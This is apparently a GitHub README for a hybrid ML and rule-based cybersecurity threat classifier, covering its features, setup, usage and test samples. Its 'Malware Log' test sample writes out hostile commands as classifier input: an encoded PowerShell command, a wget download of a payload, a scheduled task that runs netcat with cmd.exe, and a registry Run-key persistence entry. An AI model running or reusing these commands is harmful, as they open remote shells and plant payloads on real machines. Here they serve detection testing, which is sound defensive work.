# 🛡️ Cybersecurity Threat Classifier

[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://your-app-name.streamlit.app)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A comprehensive **Hybrid AI + Rule-Based** cybersecurity threat classification system designed for enterprise security operations. This application combines Machine Learning ensemble models with expert rule-based detection to identify phishing attempts, malware threats, and suspicious content.

## 🚀 Live Demo

**Try the app here:** [cybersecurity-threat-classifier](https://cybersecurity-threat-classifier.streamlit.app/)

<img width="2879" height="1919" alt="image" src="https://github.com/user-attachments/assets/bee64f22-6293-4e2e-9df8-dbd0ed6019cb" />


## 🌟 Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **📧 Text/Email Analysis** | Classify emails and logs as phishing, malware, or safe |
| **🌐 IP Threat Intelligence** | Full IP analysis with geolocation, reputation, open ports, and vulnerabilities |
| **🔗 URL Security Analysis** | Detect phishing URLs, shortened links, brand impersonation |
| **🏷️ File Hash Lookup** | Check MD5/SHA-1/SHA-256 hashes against malware databases |
| **📜 Scan History** | Persistent storage of all scans with SQLite |
| **📄 Report Generation** | Download analysis results as text or JSON reports |

### Machine Learning

- **5-Model Ensemble**: Naive Bayes, Logistic Regression, Random Forest, Gradient Boosting, SVM
- **TF-IDF Vectorization**: N-gram analysis (1-3 grams) with 5000 features
- **Soft Voting**: Probability-based ensemble predictions
- **94%+ Accuracy**: Cross-validated performance on threat detection

### Rule-Based Detection

- **200+ Threat Patterns**: Phishing, malware, and safe content signatures
- **Regex Pattern Matching**: Base64 detection, IP extraction, suspicious extensions
- **Contextual Analysis**: Urgency language, threatening words, pressure tactics
- **Severity Scoring**: Critical, High, Medium, Low threat levels

### Security Integrations

| Service | Purpose |
|---------|---------|
| **ip-api.com** | IP geolocation (country, city, ISP) |
| **AbuseIPDB** | IP reputation and abuse reports |
| **Shodan** | Open ports, vulnerabilities (CVEs), services |
| **VirusTotal** | File hash malware detection |


## 🧠 How It Works

                    INPUT TEXT/EMAIL/LOG
                           │
                           ▼
    ┌──────────────────────────────────────────┐
    │           HYBRID CLASSIFIER              │
    │                                          │
    │   ┌─────────────┐   ┌─────────────────┐  │
    │   │ ML Ensemble │   │  Rule Engine    │  │
    │   │             │   │                 │  │
    │   │ • Naive     │   │ • 200+ Patterns │  │
    │   │   Bayes     │   │ • Regex Rules   │  │
    │   │ • Logistic  │   │ • Context       │  │
    │   │   Regression│   │   Analysis      │  │
    │   │ • Random    │   │ • Urgency       │  │
    │   │   Forest    │   │   Detection     │  │
    │   │ • Gradient  │   │                 │  │
    │   │   Boosting  │   │                 │  │
    │   │ • SVM       │   │                 │  │
    │   └─────────────┘   └─────────────────┘  │
    │          │                   │           │
    │          ▼                   ▼           │
    │   ML Probabilities    Rule Scores        │
    │          │                   │           │
    │          └─────────┬─────────┘           │
    │                    ▼                     │
    │     Weighted Combination (60/40)         │
    └──────────────────────────────────────────┘
                           │
                           ▼
    ┌──────────────────────────────────────────┐
    │              FINAL OUTPUT                │
    │                                          │
    │  • Classification: Phishing/Malware/Safe │
    │  • Confidence: 0-100%                    │
    │  • Threat Level: Critical/High/Med/Low   │
    │  • Detected Indicators                   │
    │  • Security Recommendations              │
    └──────────────────────────────────────────┘


## 📊 Threat Categories

| Category | Icon | Description | Examples |
|----------|------|-------------|----------|
| **Phishing** | 🎣 | Social engineering attacks | Fake login pages, credential theft emails |
| **Malware** | 🦠 | Malicious code or commands | PowerShell attacks, ransomware, trojans |
| **Suspicious** | ⚠️ | Uncertain/borderline content | Low confidence results |
| **Safe** | ✅ | Legitimate content | Normal business emails |


## 🚀 Quick Start

### Prerequisites

- Python 3.8 or higher
- pip (Python package manager)

### Installation

```bash
# Clone the repository
git clone https://github.com/pranav-sarotra/cybersecurity-threat-classifier.git
cd cybersecurity-threat-classifier

# Create virtual environment
python -m venv venv

# Activate virtual environment
# Windows:
venv\Scripts\activate
# Linux/Mac:
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run the application
streamlit run app.py
```
The app will open in your browser at http://localhost:8501


## 📁 Project Structure
```text
cybersecurity-threat-classifier/
│
├── app.py                      # Main Streamlit application
├── requirements.txt            # Python dependencies
├── config.yaml                 # Default configuration
├── config_local.yaml           # Local config with API keys (gitignored)
├── .gitignore                  # Git ignore rules
├── LICENSE                     # MIT License
├── README.md                   # This file
│
├── core/                       # Core classification modules
│   ├── __init__.py             # Package exports
│   ├── data_generator.py       # Training data generation
│   ├── ml_classifier.py        # ML ensemble classifier
│   ├── rule_classifier.py      # Rule-based pattern matching
│   ├── hybrid_classifier.py    # Combined ML + Rules
│   ├── ip_checker.py           # IP threat intelligence + Shodan
│   ├── url_analyzer.py         # URL security analysis
│   ├── domain_checker.py       # Domain reputation
│   └── file_analyzer.py        # File hash analysis
│
├── utils/                      # Utility modules
│   ├── __init__.py             # Package exports
│   ├── config.py               # Configuration management
│   ├── database.py             # SQLite persistence
│   ├── logger.py               # Logging system
│   ├── validators.py           # Input validation
│   └── report_generator.py     # Report generation
│
├── data/                       # Data files
│   ├── blacklists.json         # Threat intelligence
│   └── scan_history.db         # SQLite database (auto-created)
│
└── logs/                       # Log files (auto-created)
    └── security_scanner.log
```


## 🔑 API Keys Setup

### For Local Development
Create config_local.yaml in the project root:
```bash
api_keys:
  virustotal: "your_virustotal_key_here"
  abuseipdb: "your_abuseipdb_key_here"
  shodan: "your_shodan_key_here"
```


## 📖 Usage Guide

### 1. Text/Email Analysis
Paste suspicious content to analyze:

Example Phishing Email:
```text
Dear Valued Customer,
We have detected unusual activity on your account.
Your account will be SUSPENDED within 24 hours.
Click here to verify: http://bit.ly/verify-now
URGENT: Act now to avoid termination!
```
Output:
- 🎣 Classification: PHISHING ATTEMPT
- 📊 Confidence: 89.2%
- 🔴 Threat Level: HIGH
- 🔎 Detected Indicators
- 💡 Security Recommendations

---

### 2. IP Address Check
Enter an IP to get full threat intelligence:

Example: 45.33.32.156

Output includes:
| Category | Information |
|----------|-------------|
| Location |	Country, City, ISP, ASN |
| Reputation |	Threat score, abuse reports |
| Security Flags |	VPN, Proxy, Tor, Datacenter |
| Shodan | Data	Open ports, vulnerabilities, services |
| Blacklists |	Detection on threat feeds |

---

### 3. URL Analysis
Enter a URL to check for threats:
Example: http://paypal-secure.login-verify.tk/account

Checks performed:

    ✓ Suspicious TLD detection (.tk, .xyz, etc.)
    ✓ URL shortener detection
    ✓ Brand impersonation (PayPal in subdomain)
    ✓ IP-based URLs
    ✓ Excessive encoding
    ✓ Phishing keywords

---

### 4. File Hash Lookup
Enter MD5, SHA-1, or SHA-256 hash:
Example (EICAR test file): 44d88612fea8a8f36de82e1278abb02f

Output:
- Hash type detection
- Malware identification
- Threat level assessment


## 📊 Model Performance
| Metric |	Phishing |	Malware |	Safe |	Average |
|--------|-----------|----------|--------|----------|
| Precision |	0.94 |	0.96 |	0.92 |	0.94 |
| Recall |	0.92 |	0.94 |	0.95 |	0.94 |
| F1-Score |	0.93 |	0.95 |	0.93 |	0.94 |
Cross-Validation Accuracy: 94.2% (5-fold)


## 🛡️ Threat Levels
| Level |	Score |	Color |	Action Required |
|-------|---------|-------|-----------------|
| 🔴 CRITICAL |	75-100% |	Red |	Immediate isolation and response |
| 🟠 HIGH |	50-74% |	Orange |	Urgent security review |
| 🟡 MEDIUM |	25-49% |	Yellow |	Investigation recommended |
| ⚪ LOW |	1-24% |	Light Yellow |	Monitor and log |
| 🟢 NONE |	0% |	Green |	No action needed |


## 🧪 Test Samples
### Phishing Email
```text
Dear Customer,
Your account has been suspended due to unusual activity.
Click here to verify your identity immediately: http://bit.ly/secure-verify
You have 24 hours before permanent termination.
URGENT - Act now!
```
---
### Malware Log
```text
powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAA=
cmd /c wget http://192.168.1.100/payload.exe
schtasks /create /tn backdoor /tr nc.exe -e cmd.exe
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
---
### Safe Email
```text
Hi Team,

Just a reminder about tomorrow's quarterly meeting at 2 PM.
Please review the attached agenda and come prepared with updates.

Best regards,
Sarah
Project Manager
```

## 👤 Author
Pranav Sarotra

GitHub: @pranav-sarotra

## 🙏 Acknowledgments
Streamlit - Web application framework
scikit-learn - Machine learning library
ip-api.com - Free IP geolocation
AbuseIPDB - IP reputation database
Shodan - Internet intelligence platform
VirusTotal - Malware analysis platform

---

<div align="center">
Pranav Sarotra

Data Science & Artificial Intelligence Specialisation
</div>